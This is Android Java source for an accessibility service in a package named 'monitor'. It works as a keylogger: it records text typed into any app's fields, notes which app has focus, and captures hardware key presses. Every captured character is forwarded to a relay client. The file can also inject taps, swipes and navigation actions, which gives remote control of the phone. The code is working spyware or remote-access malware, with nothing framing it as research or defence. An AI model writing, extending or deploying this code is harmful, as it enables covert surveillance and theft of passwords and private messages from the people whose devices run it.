package com.nora.monitor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

import androidx.annotation.RequiresApi;

public class InputService extends AccessibilityService {

    private static final String TAG = "InputService";
    private static InputService instance;
    private boolean keylogEnabled = false;

    public static InputService getInstance() { return instance; }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.d(TAG, "InputService connected");
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    // ── Keylogger toggle ──────────────────────────────────────────────────────

    public void setKeylogEnabled(boolean enabled) {
        keylogEnabled = enabled;
        Log.d(TAG, "keylog " + (enabled ? "ON" : "OFF"));
    }

    public boolean isKeylogEnabled() { return keylogEnabled; }

    // ── Accessibility events (keylogger) ──────────────────────────────────────

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!keylogEnabled) return;

        try {
            int type = event.getEventType();

            // Capture text changes in input fields (most reliable method)
            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence before = event.getBeforeText();
                CharSequence after  = event.getText().isEmpty() ? "" : event.getText().get(0);
                if (after == null) return;
                String bStr = before != null ? before.toString() : "";
                String aStr = after.toString();
                // Determine what was typed/deleted
                String typed = aStr.length() > bStr.length()
                        ? aStr.substring(bStr.length())
                        : (aStr.length() < bStr.length() ? "[DEL]" : "");
                if (!typed.isEmpty()) emitKeyChar(typed);

            } else if (type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                // Log which app/field gained focus
                CharSequence pkg = event.getPackageName();
                if (pkg != null) emitKeyChar("[FOCUS:" + pkg + "]");
            }
        } catch (Exception e) {
            Log.e(TAG, "accessibility event error", e);
        }
    }

    // Key events (hardware keyboard / special keys)
    @Override
    public boolean onKeyEvent(KeyEvent event) {
        if (keylogEnabled && event.getAction() == KeyEvent.ACTION_DOWN) {
            int code = event.getKeyCode();
            if (code == KeyEvent.KEYCODE_ENTER) {
                emitKeyChar("\n");
            } else if (code == KeyEvent.KEYCODE_DEL) {
                emitKeyChar("[DEL]");
            } else {
                int unicode = event.getUnicodeChar();
                if (unicode > 0) emitKeyChar(String.valueOf((char) unicode));
            }
        }
        return false; // never consume
    }

    private void emitKeyChar(String ch) {
        MonitorService svc = MonitorService.getInstance();
        if (svc == null) return;
        RelayClient relay = svc.getRelay();
        if (relay != null) relay.emitKeyChar(ch);
    }

    @Override
    public void onInterrupt() {}

    // ── Gesture injection ─────────────────────────────────────────────────────

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void tap(float x, float y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, 50);
        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(stroke)
            .build();
        dispatchGesture(gesture, null, null);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void swipe(float x1, float y1, float x2, float y2, long durationMs) {
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, durationMs);
        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(stroke)
            .build();
        dispatchGesture(gesture, null, null);
    }

    public void pressKey(int keyCode) {
        performGlobalAction(keyCode);
    }

    public void goBack()    { performGlobalAction(GLOBAL_ACTION_BACK); }
    public void goHome()    { performGlobalAction(GLOBAL_ACTION_HOME); }
    public void goRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }
}
